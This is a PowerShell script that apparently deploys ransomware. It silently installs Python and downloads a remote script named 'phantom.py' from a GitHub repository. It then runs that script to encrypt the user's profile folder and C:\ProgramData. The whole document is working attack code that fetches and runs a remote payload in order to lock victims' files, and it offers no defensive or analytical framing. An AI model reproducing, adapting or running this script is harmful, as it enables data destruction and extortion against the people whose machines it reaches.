# Define URLs and paths
$pythonInstallerUrl = "https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe"
$pythonInstallerPath = "$env:TEMP\python-3.12.0-amd64.exe"
$pythonScriptUrl = "https://github.com/Neev0slid/Phantom/raw/main/phantom.py"
$pythonScriptPath = "$env:TEMP\phantom.py"
$requirementsContent = "cryptography"
$directoriesToEncrypt = @(
    "$env:USERPROFILE",
    "C:\ProgramData"
)

# Download Python installer
Write-Host "Downloading Python installer..."
Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile $pythonInstallerPath

# Install Python
Write-Host "Installing Python..."
Start-Process -FilePath $pythonInstallerPath -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait

# Refresh environment variables
$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine")

# Verify Python installation
Write-Host "Verifying Python installation..."
python --version
if ($LASTEXITCODE -ne 0) {
    Write-Host "Python installation failed. Exiting."
    exit 1
}

# Install pip (if not installed)
Write-Host "Ensuring pip is installed..."
python -m ensurepip --upgrade

# Download Python script
Write-Host "Downloading Python script..."
Invoke-WebRequest -Uri $pythonScriptUrl -OutFile $pythonScriptPath

# Create requirements.txt file
Write-Host "Creating requirements.txt file..."
$requirementsPath = "$env:TEMP\requirements.txt"
Set-Content -Path $requirementsPath -Value $requirementsContent

# Install required libraries
Write-Host "Installing required libraries..."
pip install -r $requirementsPath

# Function to encrypt directories
function Encrypt-Directory {
    param (
        [string]$directory
    )

    Write-Host "Encrypting directory: $directory"
    & python $pythonScriptPath -path $directory -e
}

# Encrypt user profiles and common data
foreach ($directory in $directoriesToEncrypt) {
    Encrypt-Directory -directory $directory
}

Write-Host "Encryption complete."
